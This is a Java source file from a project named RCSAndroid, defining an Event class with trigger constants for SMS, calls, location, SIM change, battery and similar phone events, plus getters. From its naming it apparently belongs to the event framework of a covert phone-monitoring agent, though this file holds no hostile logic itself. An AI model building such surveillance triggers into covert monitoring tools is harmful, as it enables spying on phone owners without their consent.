/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.event;

import com.ht.RCSAndroidGUI.agent.AgentConf;

// TODO: Auto-generated Javadoc
/**
 * The Class Event.
 */
public class Event {

	/** Events definitions. */
	final public static int EVENT = 0x2000;

	/** The Constant EVENT_TIMER. */
	final public static int EVENT_TIMER = EVENT + 0x1; // Timer Event

	/** The Constant EVENT_SMS. */
	final public static int EVENT_SMS = EVENT + 0x2; // On Sms Event

	/** The Constant EVENT_CALL. */
	final public static int EVENT_CALL = EVENT + 0x3; // On Call Event

	/** The Constant EVENT_CONNECTION. */
	final public static int EVENT_CONNECTION = EVENT + 0x4; // On Connectivity
	// Event
	/** The Constant EVENT_PROCESS. */
	final public static int EVENT_PROCESS = EVENT + 0x5; // On Process Event

	/** The Constant EVENT_CELLID. */
	final public static int EVENT_CELLID = EVENT + 0x6; // On CellID Event

	/** The Constant EVENT_QUOTA. */
	final public static int EVENT_QUOTA = EVENT + 0x7; // On Disk Quota Event

	/** The Constant EVENT_SIM_CHANGE. */
	final public static int EVENT_SIM_CHANGE = EVENT + 0x8; // On Sim Change
	// Event
	/** The Constant EVENT_LOCATION. */
	final public static int EVENT_LOCATION = EVENT + 0x9; // On Position Event

	/** The Constant EVENT_AC. */
	final public static int EVENT_AC = EVENT + 0xA; // On AC (power charger)
	// Event
	/** The Constant EVENT_BATTERY. */
	final public static int EVENT_BATTERY = EVENT + 0xB; // On Battery Level
	// Event
	/** The Constant EVENT_STANDBY. */
	final public static int EVENT_STANDBY = EVENT + 0xC; // On Standby Event

	/** Events status. */
	final public static int EVENT_STOPPED = AgentConf.AGENT_STOPPED;

	/** The Constant EVENT_RUNNING. */
	final public static int EVENT_RUNNING = AgentConf.AGENT_RUNNING;

	/** Event type. */
	private final int eventType;

	/** Event unique ID. */
	private final int eventId;

	/** Event status: enabled, disabled, running, stopped. */
	private final int eventAction;

	/** Parameters. */
	private final byte[] eventParams;

	/**
	 * Instantiates a new event.
	 * 
	 * @param type
	 *            the type
	 * @param id
	 *            the id
	 * @param action
	 *            the action
	 * @param params
	 *            the params
	 */
	public Event(final int type, final int id, final int action,
			final byte[] params) {
		this.eventType = type;
		this.eventId = id;
		this.eventAction = action;
		this.eventParams = params;
	}

	/**
	 * Gets the type.
	 * 
	 * @return the type
	 */
	public int getType() {
		return this.eventType;
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.eventId;
	}

	/**
	 * Gets the action.
	 * 
	 * @return the action
	 */
	public int getAction() {
		return this.eventAction;
	}

	/**
	 * Gets the params.
	 * 
	 * @return the params
	 */
	public byte[] getParams() {
		return this.eventParams;
	}
}
